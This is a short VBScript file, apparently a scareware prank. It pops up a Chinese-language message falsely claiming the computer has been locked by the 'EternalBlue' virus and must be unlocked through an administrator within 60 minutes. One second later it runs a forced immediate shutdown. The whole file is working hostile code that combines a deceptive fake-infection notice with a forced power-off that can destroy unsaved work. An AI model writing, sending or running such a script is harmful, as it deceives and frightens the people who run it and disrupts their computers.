msgbox"密码错误！你的计算机已被内嵌病毒（永恒之蓝）锁定！"+VbCrLf+"请在60分钟内联系管理员解锁 或 解除相关程序。"
wscript.sleep 1000
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "shutdown -f -s -t 00",0 ,true
